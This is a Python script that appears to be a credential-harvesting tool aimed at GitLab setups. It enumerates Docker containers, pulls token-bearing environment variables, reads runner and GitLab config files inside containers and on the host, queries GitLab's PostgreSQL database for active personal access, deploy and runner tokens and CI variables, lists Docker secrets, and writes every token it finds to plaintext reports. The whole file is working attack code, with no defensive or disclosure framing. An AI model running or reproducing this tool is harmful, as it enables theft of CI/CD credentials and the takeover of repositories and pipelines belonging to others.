#!/usr/bin/env python3

import subprocess
import json
import re
import os
from datetime import datetime
from pathlib import Path

class ContainerGitLabExtractor:
    def __init__(self):
        self.findings = []
        self.containers = []
        self.gitlab_configs = []
        
    def enumerate_containers(self):
        """Enumerate all running containers"""
        print("🐳 Enumerating Docker containers...")
        
        try:
            # List all containers (running and stopped)
            result = subprocess.run([
                'docker', 'ps', '-a', '--format', 
                'table {{.ID}}\t{{.Image}}\t{{.Names}}\t{{.Status}}\t{{.Ports}}'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')[1:]  # Skip header
                print(f"✅ Found {len(lines)} containers:")
                
                for line in lines:
                    parts = line.split('\t')
                    if len(parts) >= 4:
                        container = {
                            'id': parts[0],
                            'image': parts[1],
                            'name': parts[2],
                            'status': parts[3],
                            'ports': parts[4] if len(parts) > 4 else ''
                        }
                        self.containers.append(container)
                        
                        status_emoji = "🟢" if "Up" in container['status'] else "🔴"
                        print(f"  {status_emoji} {container['name']} ({container['image']}) - {container['status']}")
                        
            else:
                print(f"❌ Failed to list containers: {result.stderr}")
                
        except Exception as e:
            print(f"❌ Error enumerating containers: {e}")
            
    def extract_container_env_vars(self, container_id):
        """Extract environment variables from a container"""
        print(f"\n🔍 Extracting environment variables from container {container_id[:12]}...")
        
        gitlab_env_vars = {}
        
        try:
            # Get environment variables
            result = subprocess.run([
                'docker', 'inspect', container_id, '--format', 
                '{{range .Config.Env}}{{println .}}{{end}}'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                env_vars = result.stdout.strip().split('\n')
                
                gitlab_patterns = [
                    r'.*GITLAB.*',
                    r'.*CI_.*',
                    r'.*RUNNER.*',
                    r'.*GIT.*TOKEN.*',
                    r'.*PRIVATE.*TOKEN.*',
                    r'.*REGISTRY.*PASSWORD.*',
                    r'.*REGISTRY.*TOKEN.*'
                ]
                
                for env_var in env_vars:
                    if '=' in env_var:
                        key, value = env_var.split('=', 1)
                        
                        # Check if it matches GitLab patterns
                        for pattern in gitlab_patterns:
                            if re.match(pattern, key, re.IGNORECASE):
                                gitlab_env_vars[key] = value
                                print(f"  🔑 {key}={value}")
                                
                if gitlab_env_vars:
                    self.findings.append({
                        'type': 'container_env_vars',
                        'container_id': container_id,
                        'gitlab_vars': gitlab_env_vars
                    })
                else:
                    print("  ℹ️ No GitLab-related environment variables found")
                    
        except Exception as e:
            print(f"❌ Error extracting env vars: {e}")
            
        return gitlab_env_vars
    
    def search_container_files(self, container_id):
        """Search for GitLab-related files in containers"""
        print(f"\n📁 Searching for GitLab files in container {container_id[:12]}...")
        
        found_files = []
        
        # Common GitLab file locations
        search_paths = [
            '/etc/gitlab/',
            '/var/opt/gitlab/',
            '/opt/gitlab/',
            '/gitlab-runner/',
            '/etc/gitlab-runner/',
            '/home/gitlab-runner/',
            '/root/.gitlab-runner/',
            '/.gitlab-ci.yml',
            '/config.toml',
            '/builds/',
            '/cache/'
        ]
        
        for search_path in search_paths:
            try:
                # Check if path exists in container
                result = subprocess.run([
                    'docker', 'exec', container_id, 'find', search_path, 
                    '-type', 'f', '-name', '*gitlab*', '2>/dev/null'
                ], capture_output=True, text=True)
                
                if result.returncode == 0 and result.stdout.strip():
                    files = result.stdout.strip().split('\n')
                    for file_path in files:
                        if file_path:
                            found_files.append(file_path)
                            print(f"  📄 {file_path}")
                            
            except Exception as e:
                continue
                
        # Also search for common config files
        config_files = [
            '/etc/gitlab-runner/config.toml',
            '/etc/gitlab/gitlab.rb',
            '/var/opt/gitlab/gitlab-rails/etc/gitlab.yml',
            '/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml'
        ]
        
        for config_file in config_files:
            try:
                result = subprocess.run([
                    'docker', 'exec', container_id, 'cat', config_file
                ], capture_output=True, text=True)
                
                if result.returncode == 0:
                    print(f"  📄 Found config: {config_file}")
                    found_files.append(config_file)
                    
                    # Extract tokens from config content
                    content = result.stdout
                    self.extract_tokens_from_content(content, f"{container_id}:{config_file}")
                    
            except Exception as e:
                continue
                
        if found_files:
            self.findings.append({
                'type': 'container_files',
                'container_id': container_id,
                'files': found_files
            })
            
        return found_files
    
    def extract_tokens_from_content(self, content, source):
        """Extract GitLab tokens from file content"""
        
        token_patterns = {
            'gitlab_runner_token': r'token\s*=\s*["\']([a-zA-Z0-9_-]+)["\']',
            'registration_token': r'registration-token\s*=\s*["\']([a-zA-Z0-9_-]+)["\']',
            'ci_token': r'CI_TOKEN["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]+)["\']?',
            'private_token': r'private[_-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]+)["\']?',
            'personal_access_token': r'(glpat-[a-zA-Z0-9_-]{20,})',
            'deploy_token': r'(gldt-[a-zA-Z0-9_-]{20,})',
            'job_token': r'job[_-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]+)["\']?',
            'api_token': r'api[_-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]+)["\']?'
        }
        
        found_tokens = {}
        
        for token_type, pattern in token_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            if matches:
                found_tokens[token_type] = matches
                
        if found_tokens:
            print(f"  🎯 Found tokens in {source}:")
            for token_type, tokens in found_tokens.items():
                for token in tokens:
                    print(f"    🔑 {token_type}: {token}")
                    
            self.findings.append({
                'type': 'extracted_tokens',
                'source': source,
                'tokens': found_tokens
            })
            
    def check_gitlab_runner_containers(self):
        """Specifically check for GitLab Runner containers"""
        print("\n🏃 Checking for GitLab Runner containers...")
        
        runner_containers = []
        
        for container in self.containers:
            # Check if it's a GitLab Runner container
            if any(keyword in container['image'].lower() for keyword in ['gitlab-runner', 'runner']):
                runner_containers.append(container)
                print(f"  🎯 Found runner container: {container['name']} ({container['image']})")
                
                # Extract runner configuration
                self.extract_runner_config(container['id'])
                
        return runner_containers
    
    def extract_runner_config(self, container_id):
        """Extract GitLab Runner configuration"""
        print(f"  📋 Extracting runner configuration from {container_id[:12]}...")
        
        try:
            # Try to get runner config
            result = subprocess.run([
                'docker', 'exec', container_id, 'cat', '/etc/gitlab-runner/config.toml'
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                config_content = result.stdout
                print("  ✅ Found config.toml:")
                
                # Parse TOML content for tokens
                lines = config_content.split('\n')
                for line in lines:
                    if 'token' in line.lower() and '=' in line:
                        print(f"    🔑 {line.strip()}")
                        
                self.findings.append({
                    'type': 'runner_config',
                    'container_id': container_id,
                    'config_content': config_content
                })
                
                # Extract specific tokens
                self.extract_tokens_from_content(config_content, f"runner_config:{container_id}")
                
        except Exception as e:
            print(f"    ❌ Error extracting runner config: {e}")
            
    def search_host_gitlab_files(self):
        """Search for GitLab files on the host system"""
        print("\n🖥️ Searching for GitLab files on host system...")
        
        # Common GitLab locations on host
        search_locations = [
            '/etc/gitlab-runner/',
            '/opt/gitlab/',
            '/var/opt/gitlab/',
            '/etc/gitlab/',
            '/home/gitlab-runner/',
            '/srv/gitlab-runner/',
            '~/.gitlab-runner/'
        ]
        
        found_files = []
        
        for location in search_locations:
            try:
                # Expand ~ if present
                expanded_location = os.path.expanduser(location)
                
                if os.path.exists(expanded_location):
                    print(f"  📁 Searching {expanded_location}...")
                    
                    # Use find to search for GitLab-related files
                    result = subprocess.run([
                        'find', expanded_location, '-type', 'f', 
                        '(', '-name', '*gitlab*', '-o', '-name', '*runner*', 
                        '-o', '-name', 'config.toml', '-o', '-name', '*.yml', ')',
                        '2>/dev/null'
                    ], capture_output=True, text=True)
                    
                    if result.returncode == 0 and result.stdout.strip():
                        files = result.stdout.strip().split('\n')
                        for file_path in files:
                            if file_path and os.path.isfile(file_path):
                                found_files.append(file_path)
                                print(f"    📄 {file_path}")
                                
                                # Try to read and extract tokens
                                try:
                                    with open(file_path, 'r') as f:
                                        content = f.read()
                                        self.extract_tokens_from_content(content, f"host:{file_path}")
                                except Exception as e:
                                    print(f"      ❌ Cannot read {file_path}: {e}")
                                    
            except Exception as e:
                print(f"  ❌ Error searching {location}: {e}")
                
        if found_files:
            self.findings.append({
                'type': 'host_files',
                'files': found_files
            })
            
        return found_files
    
    def extract_from_gitlab_database(self):
        """Try to extract tokens from GitLab database if accessible"""
        print("\n💾 Checking for GitLab database access...")
        
        # Look for GitLab database containers
        db_containers = []
        
        for container in self.containers:
            if any(db_name in container['image'].lower() for db_name in ['postgres', 'mysql', 'redis']):
                if 'gitlab' in container['name'].lower() or 'gitlab' in container['image'].lower():
                    db_containers.append(container)
                    print(f"  🗄️ Found potential GitLab database: {container['name']} ({container['image']})")
                    
        # Try to connect to GitLab databases
        for db_container in db_containers:
            self.try_database_extraction(db_container)
            
    def try_database_extraction(self, db_container):
        """Try to extract tokens from GitLab database"""
        container_id = db_container['id']
        
        print(f"  🔍 Attempting database extraction from {container_id[:12]}...")
        
        # PostgreSQL queries for GitLab
        postgres_queries = [
            "SELECT token FROM personal_access_tokens WHERE active = true;",
            "SELECT token FROM deploy_tokens WHERE expires_at > NOW() OR expires_at IS NULL;", 
            "SELECT runners_token FROM application_settings;",
            "SELECT token FROM ci_runners WHERE active = true;",
            "SELECT name, encrypted_value FROM variables WHERE type = 'Ci::Variable';"
        ]
        
        try:
            # Try PostgreSQL
            for query in postgres_queries:
                result = subprocess.run([
                    'docker', 'exec', container_id, 'psql', '-U', 'gitlab', '-d', 'gitlabhq_production',
                    '-c', query
                ], capture_output=True, text=True)
                
                if result.returncode == 0 and result.stdout.strip():
                    print(f"    ✅ Query result: {query}")
                    print(f"    📊 {result.stdout}")
                    
                    self.findings.append({
                        'type': 'database_extraction',
                        'container_id': container_id,
                        'query': query,
                        'result': result.stdout
                    })
                    
        except Exception as e:
            print(f"    ❌ Database extraction failed: {e}")
            
    def check_docker_secrets(self):
        """Check Docker secrets for GitLab credentials"""
        print("\n🔒 Checking Docker secrets...")
        
        try:
            result = subprocess.run(['docker', 'secret', 'ls'], capture_output=True, text=True)
            
            if result.returncode == 0:
                secrets = result.stdout.strip().split('\n')[1:]  # Skip header
                
                for secret_line in secrets:
                    if secret_line and ('gitlab' in secret_line.lower() or 'ci' in secret_line.lower()):
                        secret_name = secret_line.split()[1]  # Get secret name
                        print(f"  🔒 Found GitLab-related secret: {secret_name}")
                        
                        self.findings.append({
                            'type': 'docker_secret',
                            'secret_name': secret_name
                        })
                        
        except Exception as e:
            print(f"❌ Error checking Docker secrets: {e}")
            
    def generate_extraction_report(self):
        """Generate comprehensive extraction report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"container_gitlab_extraction_{timestamp}.json"
        
        report = {
            'extraction_timestamp': timestamp,
            'containers_analyzed': len(self.containers),
            'total_findings': len(self.findings),
            'containers': self.containers,
            'findings': self.findings,
            'summary': self.generate_summary()
        }
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, ensure_ascii=False, default=str)
            
        # Generate text report
        text_report = report_file.replace('.json', '.txt')
        with open(text_report, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("🐳 CONTAINER GITLAB EXTRACTION REPORT\n")
            f.write("=" * 80 + "\n")
            f.write(f"Extraction Time: {timestamp}\n")
            f.write(f"Containers Analyzed: {len(self.containers)}\n")
            f.write(f"Total Findings: {len(self.findings)}\n\n")
            
            # Show extracted tokens
            token_findings = [f for f in self.findings if f.get('type') == 'extracted_tokens']
            if token_findings:
                f.write("🔑 EXTRACTED TOKENS:\n")
                f.write("-" * 40 + "\n")
                for finding in token_findings:
                    f.write(f"Source: {finding['source']}\n")
                    for token_type, tokens in finding['tokens'].items():
                        for token in tokens:
                            f.write(f"  {token_type}: {token}\n")
                    f.write("\n")
            
            # Show runner configs
            runner_findings = [f for f in self.findings if f.get('type') == 'runner_config']
            if runner_findings:
                f.write("🏃 RUNNER CONFIGURATIONS:\n")
                f.write("-" * 40 + "\n")
                for finding in runner_findings:
                    f.write(f"Container: {finding['container_id']}\n")
                    f.write(f"Config:\n{finding['config_content']}\n\n")
        
        print(f"\n📊 Extraction report saved to: {report_file}")
        print(f"📄 Text report: {text_report}")
        
        return report
    
    def generate_summary(self):
        """Generate summary of findings"""
        summary = {
            'token_sources': len([f for f in self.findings if 'token' in f.get('type', '')]),
            'runner_configs': len([f for f in self.findings if f.get('type') == 'runner_config']),
            'database_extractions': len([f for f in self.findings if f.get('type') == 'database_extraction']),
            'docker_secrets': len([f for f in self.findings if f.get('type') == 'docker_secret']),
            'host_files': len([f for f in self.findings if f.get('type') == 'host_files'])
        }
        
        return summary
        
    def run_comprehensive_extraction(self):
        """Run comprehensive GitLab credential extraction"""
        print("🚀 Starting Container GitLab Credential Extraction")
        print("=" * 80)
        
        # Enumerate containers
        self.enumerate_containers()
        
        # Check each container for GitLab credentials
        for container in self.containers:
            print(f"\n🔍 Analyzing container: {container['name']} ({container['id'][:12]})")
            
            # Extract environment variables
            self.extract_container_env_vars(container['id'])
            
            # Search for GitLab files
            self.search_container_files(container['id'])
            
        # Check specifically for GitLab Runner containers
        self.check_gitlab_runner_containers()
        
        # Search host system
        self.search_host_gitlab_files()
        
        # Check database access
        self.extract_from_gitlab_database()
        
        # Check Docker secrets
        self.check_docker_secrets()
        
        # Generate report
        report = self.generate_extraction_report()
        
        # Print summary
        self.print_extraction_summary()
        
        return report
    
    def print_extraction_summary(self):
        """Print extraction summary"""
        print("\n" + "=" * 80)
        print("📊 EXTRACTION SUMMARY")
        print("=" * 80)
        
        if not self.findings:
            print("❌ No GitLab credentials found in containers")
            return
            
        print(f"✅ Found {len(self.findings)} potential credential sources:")
        
        # Count findings by type
        finding_types = {}
        for finding in self.findings:
            finding_type = finding.get('type', 'unknown')
            finding_types[finding_type] = finding_types.get(finding_type, 0) + 1
            
        for finding_type, count in finding_types.items():
            print(f"  📋 {finding_type}: {count}")
            
        # Show key tokens found
        token_findings = [f for f in self.findings if f.get('type') == 'extracted_tokens']
        if token_findings:
            print(f"\n🎯 KEY TOKENS EXTRACTED:")
            for finding in token_findings[:5]:  # Show first 5
                source = finding.get('source', 'Unknown')
                tokens = finding.get('tokens', {})
                print(f"  📄 {source}:")
                for token_type, token_list in tokens.items():
                    for token in token_list:
                        print(f"    🔑 {token_type}: {token}")

def main():
    extractor = ContainerGitLabExtractor()
    extractor.run_comprehensive_extraction()

if __name__ == "__main__":
    main()
